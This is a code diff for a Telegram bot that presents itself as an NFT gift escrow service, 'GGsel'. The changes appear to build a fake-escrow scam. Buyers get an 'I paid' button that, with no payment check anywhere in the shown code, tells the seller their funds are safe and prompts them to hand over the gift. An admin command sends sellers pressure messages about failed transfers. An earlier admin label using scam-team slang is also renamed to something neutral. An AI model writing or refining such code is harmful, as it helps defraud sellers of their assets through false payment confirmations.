@@ -95,11 +95,11 @@ def welcome_text():
         "1⃣ Автоматические сделки с NFT и подарками\n"
         f"2⃣ {shield_emoji()} Полная защита обеих сторон\n"
         f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
-        f"4⃣ {emoji('package')} Все сделки проходят между покупателем и продавцем </blockquote>\n\n"
+        f"4⃣ {emoji('package')} Все сделки проходят через менеджера</blockquote>\n\n"
         f"{emoji('lamp')} Наш канал ─ @ggsel"
     )
 
-ADMIN_TEXT = "👑 панель-ворка\n\nВыберите действие:"
+ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"
 
 class DealStates(StatesGroup):
     waiting_role = State()
@@ -304,7 +304,7 @@ async def complete_deal_logic(deal_id, msg=None, call=None):
     except: pass
     save_data()
 
-# ===== ОБРАБОТЧИК ПРИСОЕДИНЕНИЯ ПО КОДУ =====
+# ===== ОБРАБОТЧИК ПРИСОЕДИНЕНИЯ ПО КОДУ (ОБНОВЛЁН) =====
 async def join_deal_by_code(message: Message, code: str):
     uid = str(message.from_user.id)
     deal_id = invite_codes.get(code)
@@ -319,27 +319,61 @@ async def join_deal_by_code(message: Message, code: str):
         deal["buyer_id"] = uid
     else:
         return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
+
     if deal["seller_id"] is not None and deal["buyer_id"] is not None:
         deal["status"] = "active"
-    other_id = deal["seller_id"] if deal["seller_id"] != uid else deal["buyer_id"]
-    if other_id:
+        seller_id = deal["seller_id"]
+        buyer_id = deal["buyer_id"]
+        memo = deal.get("invite_code", str(deal_id))
+        buyer_username = username_or_id(buyer_id)
+        buyer_completed = users.get(str(buyer_id), {}).get("completed_deals", 0)
+
+        # Сообщение продавцу с кнопкой "Я знаю"
+        msg_text = (
+            f"<b>Пользователь присоединился к вашей сделке <code>{memo}</code></b>\n"
+            f"• Количество сделок покупателя: {buyer_completed}\n"
+            "<blockquote>Убедитесь, что это тот же пользователь, с которым вы вели диалог ранее!</blockquote>\n\n"
+            f"<b>Передавайте товар только покупателю - {buyer_username}</b>, в ином случае товар будет утерян.\n\n"
+            "<b>ВНИМАНИЕ!</b>\n"
+            "Обязательно передавайте подарок покупателю, иначе вы можете потерять свой подарок"
+        )
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Я знаю", callback_data=f"acknowledge_{deal_id}")]
+        ])
         try:
-            await bot.send_message(other_id,
-                f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
-                f"Продавец: {username_or_id(deal['seller_id'])}\n"
-                f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
-                f"Статус: {deal_status_text(deal)}\n"
-                f"Сумма: {deal['amount']} {deal['currency']}"
-            )
-        except: pass
-    await message.answer(
-        f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
-        f"Продавец: {username_or_id(deal['seller_id'])}\n"
-        f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
-        f"Статус: {deal_status_text(deal)}\n"
-        f"Сумма: {deal['amount']} {deal['currency']}",
-        reply_markup=main_menu(get_lang(uid))
-    )
+            await bot.send_message(seller_id, msg_text, reply_markup=kb)
+        except:
+            pass
+
+        # Сообщение покупателю с кнопкой "Я оплатил"
+        await message.answer(
+            f"✅ <b>Вы присоединились к сделке #{deal_id}!</b>\n\n"
+            f"Продавец: {username_or_id(seller_id)}\n"
+            f"Покупатель: {username_or_id(buyer_id)}\n"
+            f"Сумма: {deal['amount']} {deal['currency']}\n"
+            f"Описание: {deal.get('description', '—')}\n\n"
+            "<i>Нажмите кнопку, когда оплатите товар.</i>",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Я оплатил", callback_data=f"i_paid_{deal_id}")]
+            ])
+        )
+    else:
+        other_id = deal["seller_id"] if deal["seller_id"] != uid else deal["buyer_id"]
+        if other_id:
+            try:
+                await bot.send_message(other_id,
+                    f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
+                    f"Продавец: {username_or_id(deal['seller_id'])}\n"
+                    f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
+                    f"Статус: {deal_status_text(deal)}\n"
+                    f"Сумма: {deal['amount']} {deal['currency']}"
+                )
+            except: pass
+        await message.answer(
+            f"✅ Вы присоединились к сделке #{deal_id}!\n"
+            f"Ожидаем вторую сторону.",
+            reply_markup=main_menu(get_lang(uid))
+        )
     save_data()
 
 # ===== ХЕНДЛЕРЫ =====
@@ -473,6 +507,96 @@ async def admin_remove_secret(message: Message):
             await message.answer(f"✅ Администратор {rem_admin} удалён.")
     except:
         await message.answer("❌ Формат: /adminteam213 <user_id>")
+
+# ===== КОМАНДА /otvet ДЛЯ ПРЕДУПРЕЖДЕНИЯ ПРОДАВЦА =====
+@dp.message(Command("otvet"))
+async def admin_warning(message: Message):
+    if not is_admin(message.from_user.id):
+        return await message.answer("❌ Нет доступа.")
+    try:
+        _, deal_id_s = message.text.split()
+        deal_id = int(deal_id_s)
+        deal = deals.get(deal_id)
+        if not deal or deal["status"] != "active":
+            return await message.answer("❌ Сделка не найдена или не активна.")
+        seller_id = deal["seller_id"]
+        await bot.send_message(
+            seller_id,
+            "<blockquote>Извините, вы не передали свой NFT подарок. Просим вас не обманывать. С уважением, GGsel</blockquote>",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Назад", callback_data=f"acknowledge_{deal_id}")]
+            ])
+        )
+        await message.answer("✅ Предупреждение отправлено продавцу.")
+    except:
+        await message.answer("❌ Формат: /otvet <id сделки>")
+
+# ===== ОБРАБОТЧИКИ НОВЫХ КНОПОК =====
+@dp.callback_query(F.data.startswith("acknowledge_"))
+async def process_acknowledge(call: CallbackQuery):
+    deal_id = int(call.data.split("_")[1])
+    deal = deals.get(deal_id)
+    if not deal or deal["status"] != "active":
+        await call.answer("Сделка уже не активна.", show_alert=True)
+        return
+    if str(call.from_user.id) != deal["seller_id"]:
+        await call.answer("Эта кнопка не для вас.", show_alert=True)
+        return
+
+    await call.message.edit_text(
+        call.message.html_text + "\n\n<b>Теперь вы можете передать подарок и нажать кнопку ниже.</b>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Я передал(а)", callback_data=f"i_transferred_{deal_id}")]
+        ])
+    )
+    await call.answer()
+
+@dp.callback_query(F.data.startswith("i_paid_"))
+async def process_payment(call: CallbackQuery):
+    deal_id = int(call.data.split("_")[2])
+    deal = deals.get(deal_id)
+    if not deal or deal["status"] != "active":
+        await call.answer("Сделка уже не активна.", show_alert=True)
+        return
+    if str(call.from_user.id) != deal["buyer_id"]:
+        await call.answer("Эта кнопка не для вас.", show_alert=True)
+        return
+
+    memo = deal.get("invite_code", str(deal_id))
+    await bot.send_message(
+        deal["seller_id"],
+        f"<b>Покупатель оплатил сделку #{memo}</b>\n\n"
+        "<blockquote>Ваши средства в безопасности</blockquote>\n"
+        "<i>Отправьте подарок</i>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Я передал(а)", callback_data=f"i_transferred_{deal_id}")]
+        ])
+    )
+    await call.message.edit_text("<b>✅ Вы отметили оплату. Ожидайте передачу товара.</b>")
+    await call.answer()
+
+@dp.callback_query(F.data.startswith("i_transferred_"))
+async def process_transfer(call: CallbackQuery):
+    deal_id = int(call.data.split("_")[2])
+    deal = deals.get(deal_id)
+    if not deal or deal["status"] != "active":
+        await call.answer("Сделка уже не активна.", show_alert=True)
+        return
+    if str(call.from_user.id) != deal["seller_id"]:
+        await call.answer("Эта кнопка не для вас.", show_alert=True)
+        return
+
+    buyer_id = deal["buyer_id"]
+    await bot.send_message(
+        buyer_id,
+        "<b>✅ Продавец подтвердил передачу товара.</b>\n<i>Проверьте получение. При проблемах обратитесь в поддержку.</i>"
+    )
+    await bot.send_message(
+        deal["seller_id"],
+        "<b>✅ Спасибо!</b>\n<i>Отправьте скриншот покупателю как подтверждение.</i>"
+    )
+    await call.message.edit_reply_markup(reply_markup=None)
+    await call.answer()
 
 # ===== ГЛАВНОЕ МЕНЮ =====
 @dp.callback_query(F.data == "main_menu")
